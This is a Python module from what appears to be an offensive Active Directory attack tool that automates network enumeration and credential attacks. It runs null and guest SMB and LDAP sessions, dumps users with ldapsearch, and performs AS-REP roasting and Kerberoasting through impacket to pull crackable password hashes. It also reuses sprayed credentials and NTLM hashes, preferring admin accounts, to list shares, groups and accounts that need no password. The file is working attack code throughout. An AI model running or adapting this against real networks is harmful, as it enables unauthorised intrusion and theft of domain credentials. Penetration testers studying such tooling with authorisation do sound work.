import os
import shutil
import tempfile
from rich.console import Console
from .models import EnumSession, CredentialResult
from .runner import Runner


def _dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))


def _find(*names: str) -> str | None:
    for n in names:
        if shutil.which(n):
            return n
    return None


class ExtraEnumerator:
    """Direct-mode additional enumeration: anonymous phase + credential-based phase."""

    def __init__(self, console: Console, session: EnumSession):
        self.console = console
        self.session = session
        self.runner = Runner(console, session)

    # ── Phase 1: anonymous + userlist ────────────────────────────────────

    def run_anon(self, users: list[str]):
        self.console.rule("[bold #7aab7a]  Extra Enumeration  ", style="#30363d")
        ran = False

        for ip, host in self.session.hosts.items():
            ports = set(host.open_ports.keys())

            # SMB anonymous enum (null + guest)
            if 445 in ports:
                ran = True
                self.console.print(f"\n  [#c9a96e]► {ip} — SMB null + guest session[/#c9a96e]")
                for user in ["", "guest"]:
                    self.runner.run(["nxc", "smb", ip, "-u", user, "-p", "", "--shares"],
                                    label=f"SMB shares ({user!r}) {ip}")
                if _find("enum4linux-ng"):
                    self.runner.run(["enum4linux-ng", "-A", ip], label=f"enum4linux-ng {ip}")
                else:
                    self.console.print("  [dim #8b949e]  enum4linux-ng not found, skipping[/dim #8b949e]")

            # LDAP anonymous enum
            if ports & {389, 636}:
                ran = True
                scheme = "ldaps" if 636 in ports and 389 not in ports else "ldap"
                self.console.print(f"\n  [#c9a96e]► {ip} — LDAP anonymous ({scheme})[/#c9a96e]")
                for anon_user in ["", "guest"]:
                    self.runner.run(
                        ["nxc", "ldap", ip, "-u", anon_user, "-p", "", "--users"],
                        label=f"LDAP anon user={anon_user!r} {ip}",
                    )
                domain = self.session.domain
                if domain != "Unknown" and "." in domain:
                    self.runner.run(
                        [
                            "ldapsearch", "-H", f"{scheme}://{ip}",
                            "-x", "-b", _dn(domain), "-s", "sub",
                            "(&(objectClass=user)(objectCategory=person))",
                            "sAMAccountName", "description", "memberOf",
                        ],
                        label=f"ldapsearch {ip}",
                    )

        # AS-REP roasting — only needs a user list, no password
        domain = self.session.domain
        dc_ips = [ip for ip, h in self.session.hosts.items() if 88 in h.open_ports]
        if users and dc_ips and domain != "Unknown" and "." in domain:
            ran = True
            asrep_cmd = _find("impacket-GetNPUsers", "GetNPUsers.py")
            if asrep_cmd:
                tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
                tmp.write("\n".join(users))
                tmp.close()
                try:
                    for dc_ip in dc_ips:
                        self.console.print(f"\n  [#c9a96e]► {dc_ip} — AS-REP roasting[/#c9a96e]")
                        self.runner.run(
                            [
                                asrep_cmd, f"{domain}/",
                                "-no-pass", "-usersfile", tmp.name,
                                "-dc-ip", dc_ip, "-format", "hashcat",
                            ],
                            label=f"AS-REP {dc_ip}",
                        )
                finally:
                    os.unlink(tmp.name)
            else:
                self.console.print("  [dim #8b949e]  impacket-GetNPUsers not found, skipping AS-REP[/dim #8b949e]")

        if not ran:
            self.console.print("  [dim #8b949e]  No applicable ports found for extra enumeration[/dim #8b949e]")
        self.console.print()

    # ── Phase 2: credential-based (verified spray results only) ──────────

    def run_auth(self):
        valid = [c for c in self.session.credentials if c.success]
        if not valid:
            return

        # Best cred per host: prefer admin, prefer password over hash
        best: dict[str, CredentialResult] = {}
        for c in valid:
            prev = best.get(c.ip)
            if prev is None:
                best[c.ip] = c
            elif c.is_admin and not prev.is_admin:
                best[c.ip] = c
            elif not c.is_ntlm and prev.is_ntlm and not prev.is_admin:
                best[c.ip] = c

        self.console.rule("[bold #7aab7a]  Credential-based Enumeration  ", style="#30363d")

        for ip, cred in best.items():
            host = self.session.hosts.get(ip)
            if not host:
                continue
            ports = set(host.open_ports.keys())
            auth = _auth_args(cred)

            if 445 in ports:
                self.console.print(f"\n  [#c9a96e]► {ip} — SMB auth ({cred.username})[/#c9a96e]")
                for flag in ["--shares", "--users", "--groups"]:
                    self.runner.run(
                        ["nxc", "smb", ip] + auth + [flag],
                        label=f"SMB {flag} {ip}",
                    )

            if ports & {389, 636}:
                self.console.print(f"\n  [#c9a96e]► {ip} — LDAP auth ({cred.username})[/#c9a96e]")
                for flag in ["--users", "--groups", "--password-not-required", "--admin-count"]:
                    self.runner.run(
                        ["nxc", "ldap", ip] + auth + [flag],
                        label=f"LDAP {flag} {ip}",
                    )

        # Kerberoast: one domain password cred → target DC
        domain = self.session.domain
        if domain == "Unknown" or "." not in domain:
            return
        dc_ips = [ip for ip, h in self.session.hosts.items() if 88 in h.open_ports]
        if not dc_ips:
            return
        spn_cmd = _find("impacket-GetUserSPNs", "GetUserSPNs.py")
        if not spn_cmd:
            return
        # Kerberoast requires a cleartext password (no hash-based option easily)
        pw_cred = next((c for c in valid if not c.is_ntlm), None)
        if pw_cred is None:
            return
        self.console.print(f"\n  [#c9a96e]► {dc_ips[0]} — Kerberoast[/#c9a96e]")
        self.runner.run(
            [
                spn_cmd, f"{domain}/{pw_cred.username}:{pw_cred.password}",
                "-dc-ip", dc_ips[0], "-request",
            ],
            label=f"Kerberoast {dc_ips[0]}",
        )
        self.console.print()


def _auth_args(cred: CredentialResult) -> list[str]:
    return ["-u", cred.username, "-H", cred.password] if cred.is_ntlm else ["-u", cred.username, "-p", cred.password]
